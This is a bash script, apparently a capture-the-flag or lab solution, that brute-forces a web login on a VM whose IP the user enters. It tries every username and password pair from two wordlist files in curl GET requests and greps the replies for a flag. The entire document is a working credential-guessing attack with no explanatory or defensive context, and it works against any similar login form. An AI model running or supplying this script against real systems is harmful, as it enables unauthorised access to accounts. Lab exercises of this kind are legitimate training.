#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/"
dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

while read username; do
	while read password; do
		response=$(curl -G -s -d "page=signin" -d "username=$username" -d "password=$password" -d "Login=Login" "$url" | grep "flag")
		if [ ! -z "$response" ]; then
			echo "SUCCESS - ${username}:${password}"
			response=$(cut -f3 -d ":" <<< $response | cut -c -65)
			echo "FLAG:${response}"
			break 2
		fi
	echo "FAILURE - ${username}:${password}"
	done < $dir/passwords.txt
done < $dir/usernames.txt
